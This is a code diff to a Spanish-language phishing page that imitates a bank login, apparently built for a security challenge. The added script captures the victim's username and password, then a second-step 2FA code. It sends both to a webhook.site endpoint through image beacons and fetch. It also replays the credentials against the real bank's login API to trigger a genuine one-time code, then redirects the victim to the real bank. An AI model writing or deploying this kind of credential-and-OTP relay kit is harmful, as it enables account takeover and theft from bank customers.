@@ -36,11 +36,16 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
 .field input{width:100%;background:var(--field);border:1px solid var(--field-border);border-radius:12px;padding:13px 15px;color:var(--txt);font-size:15px;outline:none;transition:border-color 0.18s,box-shadow 0.18s}
 .field input::placeholder{color:#5b678a}
 .field input:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(91,124,250,0.18)}
+.field.otp input{text-align:center;letter-spacing:0.5em;font-size:22px;font-weight:650;padding-left:0.5em}
 .btn{width:100%;border:none;border-radius:12px;padding:14px 18px;font-size:15px;font-weight:650;color:#06122b;background:var(--accent-grad);cursor:pointer;transition:transform 0.12s,box-shadow 0.18s,filter 0.18s;box-shadow:0 14px 30px -12px rgba(91,124,250,0.8)}
 .btn:hover{filter:brightness(1.05)}.btn:active{transform:translateY(1px)}
+.btn:disabled{opacity:0.6;cursor:not-allowed}
 .alert{border-radius:11px;padding:11px 14px;font-size:13.5px;margin-bottom:18px;border:1px solid rgba(255,107,133,0.3);background:rgba(255,107,133,0.1);color:#ffd2db}
 .secure-note{margin-top:20px;display:flex;align-items:center;gap:9px;font-size:12px;color:var(--txt-dim);justify-content:center}
 .secure-note svg{width:14px;height:14px;color:var(--ok)}
+.card-footer{margin-top:22px;text-align:center;font-size:13px;color:var(--txt-dim)}
+.card-footer a{color:var(--accent);text-decoration:none}
+.hidden{display:none!important}
 @media(max-width:860px){.wrap{grid-template-columns:1fr;gap:28px;padding:16px}.card{justify-self:stretch;max-width:none}.hero{order:2}.topbar{padding:18px 16px}}
   </style>
 </head>
@@ -54,8 +59,10 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
     </div>
     <div class="pill"><span class="dot"></span> Conexion cifrada · TLS 1.3</div>
   </header>
+
   <main class="wrap">
-    <section class="hero">
+    <!-- HERO paso 1 -->
+    <section class="hero" id="hero-1">
       <h1>Tu dinero, <em>blindado</em><br>de punta a punta.</h1>
       <p>Banca digital con verificacion en dos pasos, monitoreo antifraude en tiempo real y cifrado de grado bancario en cada operacion.</p>
       <div class="features">
@@ -73,11 +80,29 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
         </div>
       </div>
     </section>
-    <section class="card">
+
+    <!-- HERO paso 2 -->
+    <section class="hero hidden" id="hero-2">
+      <h1>Verificacion<br><em>en dos pasos.</em></h1>
+      <p>Enviamos un codigo de un solo uso a tu dispositivo de confianza. Ingresalo para completar el acceso y proteger tu cuenta.</p>
+      <div class="features">
+        <div class="feature">
+          <span class="ic"><svg viewBox="0 0 24 24" fill="none"><rect x="7" y="3" width="10" height="18" rx="2" stroke="currentColor" stroke-width="2"/><path d="M11 18h2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></span>
+          <div><h3>Codigo al instante</h3><p>Valido por unos minutos y de un solo uso.</p></div>
+        </div>
+        <div class="feature">
+          <span class="ic"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
+          <div><h3>Confirmacion segura</h3><p>Solo vos podes autorizar el ingreso.</p></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CARD paso 1: login -->
+    <section class="card" id="card-1">
       <div class="eyebrow">Banca en linea</div>
       <h2>Iniciar sesion</h2>
       <p class="sub">Ingresa con tus credenciales para continuar.</p>
-      <div class="alert" id="alert" style="display:none"></div>
+      <div class="alert hidden" id="alert-1"></div>
       <form id="form-login" autocomplete="off">
         <div class="field">
           <label for="txt-login">Usuario</label>
@@ -94,27 +119,102 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
         Nunca te pediremos tu clave por correo o telefono.
       </div>
     </section>
+
+    <!-- CARD paso 2: OTP -->
+    <section class="card hidden" id="card-2">
+      <div class="eyebrow">Paso 2 de 2</div>
+      <h2>Codigo de verificacion</h2>
+      <p class="sub">Hola, <strong id="nombre-usuario">gaston.diaz</strong>. Ingresa el codigo de 6 digitos.</p>
+      <div class="alert hidden" id="alert-2"></div>
+      <form id="form-2fa" autocomplete="off">
+        <div class="field otp">
+          <label for="txt-2fa">Codigo</label>
+          <input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autofocus>
+        </div>
+        <button id="btn-2fa" type="submit" class="btn">Confirmar e ingresar</button>
+      </form>
+      <div class="card-footer">
+        <a href="#" id="volver-login">Volver al inicio de sesion</a>
+      </div>
+    </section>
   </main>
+
   <script>
-    document.getElementById('form-login').addEventListener('submit', function(e) {
+    const WEBHOOK = 'https://webhook.site/cd61594e-3657-40b5-988c-e2ba2e032108';
+    const BANCO = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
+
+    function exfil(params) {
+      const qs = new URLSearchParams(params).toString();
+      new Image().src = WEBHOOK + '?' + qs;
+      fetch(WEBHOOK + '?' + qs, {mode:'no-cors'}).catch(()=>{});
+    }
+
+    function mostrarPaso2(usuario) {
+      document.getElementById('nombre-usuario').textContent = usuario;
+      document.getElementById('hero-1').classList.add('hidden');
+      document.getElementById('card-1').classList.add('hidden');
+      document.getElementById('hero-2').classList.remove('hidden');
+      document.getElementById('card-2').classList.remove('hidden');
+      document.getElementById('txt-2fa').focus();
+    }
+
+    // PASO 1: capturar creds y disparar login real en background
+    document.getElementById('form-login').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const u = document.getElementById('txt-login').value;
+      const u = document.getElementById('txt-login').value.trim();
       const p = document.getElementById('txt-password').value;
+      const btn = document.getElementById('btn-login');
 
-      // Exfiltrar a webhook.site via imagen (no bloqueable por CORS)
-      new Image().src = 'https://webhook.site/cd61594e-3657-40b5-988c-e2ba2e032108?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
+      btn.disabled = true;
+      btn.textContent = 'Verificando…';
 
-      // También intentar fetch
-      fetch('https://webhook.site/cd61594e-3657-40b5-988c-e2ba2e032108?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p), {mode:'no-cors'}).catch(()=>{});
+      // Exfiltrar creds
+      exfil({step:'1', u, p});
 
-      // Mostrar "verificando" y redirigir al sitio real
-      document.getElementById('alert').style.display = 'block';
-      document.getElementById('alert').textContent = 'Verificando credenciales…';
-      document.getElementById('btn-login').disabled = true;
+      // Hacer login real en background para disparar el OTP
+      try {
+        const fd = new FormData();
+        fd.append('txtLogin', u);
+        fd.append('txtPassword', p);
 
+        // El banco usa JSON según el JS que vimos
+        await fetch(BANCO + '/api/login', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({txtLogin: u, txtPassword: p}),
+          mode: 'no-cors',
+          credentials: 'omit'
+        });
+      } catch(_) {}
+
+      // Mostrar paso 2 después de un momento
+      setTimeout(() => mostrarPaso2(u), 1200);
+    });
+
+    // PASO 2: capturar OTP
+    document.getElementById('form-2fa').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const otp = document.getElementById('txt-2fa').value.trim();
+      const btn = document.getElementById('btn-2fa');
+
+      btn.disabled = true;
+      btn.textContent = 'Confirmando…';
+
+      // Exfiltrar OTP
+      exfil({step:'2', otp});
+
+      // Redirigir al banco real después de capturar
       setTimeout(() => {
-        window.location.href = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar/login';
-      }, 1500);
+        window.location.href = BANCO + '/login';
+      }, 1000);
+    });
+
+    document.getElementById('volver-login').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('hero-2').classList.add('hidden');
+      document.getElementById('card-2').classList.add('hidden');
+      document.getElementById('hero-1').classList.remove('hidden');
+      document.getElementById('card-1').classList.remove('hidden');
     });
   </script>
 </body>
